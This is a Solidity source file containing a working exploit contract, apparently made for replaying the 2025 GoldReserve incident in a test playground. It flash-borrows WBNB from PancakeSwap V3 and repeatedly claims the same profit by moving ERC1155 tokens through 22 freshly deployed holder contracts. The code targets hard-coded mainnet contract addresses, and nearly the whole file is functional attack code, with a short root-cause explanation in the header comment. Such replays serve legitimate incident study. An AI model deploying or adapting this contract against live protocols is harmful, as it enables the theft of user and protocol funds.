// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-02-GoldReserve).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the PancakeSwap V3 flash-loan callback
// `pancakeV3FlashCallback` lives on the test contract itself), so there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (test/GoldReserve_exp.sol) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim, interfaces inlined (no imports so it compiles anywhere).
//
// Root cause: GoldReserve (ERC1155) tracks claimed profit per ADDRESS
// (`claimedProfitPerAddress[msg.sender]`) but computes entitlement from the
// caller's CURRENT `balanceOf` on every call. `safeTransferFrom` never touches
// `claimedProfitPerAddress` on either side of a transfer. So a holder who has
// already claimed their entitlement can move the same NFTs to a brand-new
// address (marker == 0) and claim the exact same profit again. Combined with a
// self-funded PancakeSwap V3 flash loan to seed `depositProfit`, the same 8
// NFTs are walked through 22 fresh addresses (claiming 6 BNB each) plus one
// final 1-NFT hop (0.75 BNB), netting 12.738 BNB after repaying the flash loan.

interface IGoldReserve {
    function mintPrice() external view returns (uint256);
    function depositProfit() external payable;
    function mint(uint256 id, uint256 amount) external payable;
    function claimProfit() external;
    function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes calldata data) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IWBNB {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address dst, uint256 wad) external returns (bool);
}

contract GoldReserveDrain {
    address constant VULNERABLE_CONTRACT = 0x7c77576a2b48504EBD9fF0810D799651f68742d3;
    address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    IGoldReserve private constant goldReserve = IGoldReserve(VULNERABLE_CONTRACT);
    IPancakeV3Pool private constant flashPool = IPancakeV3Pool(PANCAKE_V3_POOL);
    IWBNB private constant wbnb = IWBNB(payable(WBNB_TOKEN));

    uint256 private flashAmount;

    // Recorded attack: flash-borrow WBNB from the PancakeSwap V3 pool; the full
    // attack runs inside the flash callback below.
    function run() external {
        flashAmount = 120 ether;
        flashPool.flash(address(this), 0, flashAmount, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == PANCAKE_V3_POOL, "pool only");

        uint256 nftId = 10;
        uint256 nftAmount = 8;

        // Unwrap the flash loan, deposit stale "profit", then mint NFTs that
        // inherit it at a fresh holder address.
        wbnb.withdraw(flashAmount);
        uint256 mintCost = goldReserve.mintPrice() * nftAmount;
        goldReserve.depositProfit{value: flashAmount - mintCost}();
        address holder = _holder(0);
        payable(holder).transfer(mintCost);
        Holder(payable(holder)).mint(mintCost, nftId, nftAmount);

        // Claim once, then walk the same NFTs through 21 more fresh holder
        // addresses, claiming the same "already-paid" profit again each hop.
        _claimAndSweep(holder);
        for (uint256 i = 0; i < 21; i++) {
            address nextHolder = _holder(i + 1);
            Holder(payable(holder)).transferAll(nftId, nftAmount, nextHolder);
            _claimAndSweep(nextHolder);
            holder = nextHolder;
        }

        address finalHolder = _holder(100);
        Holder(payable(holder)).transferAll(nftId, 1, finalHolder);
        _claimAndSweep(finalHolder);

        uint256 repayAmount = flashAmount + fee1;
        wbnb.deposit{value: repayAmount}();
        wbnb.transfer(PANCAKE_V3_POOL, repayAmount);
    }

    function _holder(
        uint256 index
    ) private returns (address addr) {
        bytes32 salt = keccak256(abi.encodePacked("GoldReserve holder", index));
        Holder h = new Holder{salt: salt}();
        addr = address(h);
    }

    function _claimAndSweep(
        address holder
    ) private {
        Holder(payable(holder)).claim();

        uint256 claimed = holder.balance;
        if (claimed > 0) {
            Holder(payable(holder)).sweep(address(this), claimed);
        }
    }

    receive() external payable {}
}

// Minimal per-address holder that mints/claims/transfers on behalf of the
// exploit contract, mirroring the original test's `vm.prank(holder)` pattern
// (the original test uses precomputed EOAs; here each holder is its own tiny
// contract so it can call GoldReserve directly without cheatcodes).
contract Holder {
    address constant VULNERABLE_CONTRACT = 0x7c77576a2b48504EBD9fF0810D799651f68742d3;
    IGoldReserve private constant goldReserve = IGoldReserve(VULNERABLE_CONTRACT);

    function mint(uint256 mintCost, uint256 id, uint256 amount) external {
        goldReserve.mint{value: mintCost}(id, amount);
    }

    function claim() external {
        goldReserve.claimProfit();
    }

    function transferAll(uint256 id, uint256 amount, address to) external {
        goldReserve.safeTransferFrom(address(this), to, id, amount, "");
    }

    function sweep(address to, uint256 amount) external {
        (bool success,) = payable(to).call{value: amount}("");
        require(success, "sweep failed");
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    receive() external payable {}
}
